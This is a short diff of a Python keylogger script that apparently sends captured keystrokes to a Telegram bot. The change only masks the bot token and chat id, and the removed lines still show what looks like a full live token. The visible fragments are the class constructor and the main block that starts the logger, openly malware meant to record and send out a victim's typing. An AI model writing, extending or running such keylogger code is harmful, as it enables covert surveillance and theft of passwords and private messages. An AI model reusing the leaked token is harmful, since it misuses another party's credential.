@@ -3,7 +3,7 @@ import threading
 import requests
 
 class KeyLogger:
-    def __init__(self, interval=10, bot_token="7540605269:AAEN4Rcai0Tk0IGj18KisnEPI9VjMhdm-PY", chat_id="6420168867"):
+    def __init__(self, interval=10, bot_token="754060526....", chat_id="6420...."):
         self.log = ""
         self.interval = interval
         self.bot_token = bot_token
@@ -60,7 +60,8 @@ class KeyLogger:
 if __name__ == "__main__":
     keylogger = KeyLogger(
         interval=10,  
-        bot_token="7540605269:AAEN4Rcai0Tk0IGj18KisnEPI9VjMhdm-PY",  
-        chat_id="6420168867" 
+        bot_token="75406052....",  
+        chat_id="64...." 
     )
     keylogger.Starting_Keylogger()
+
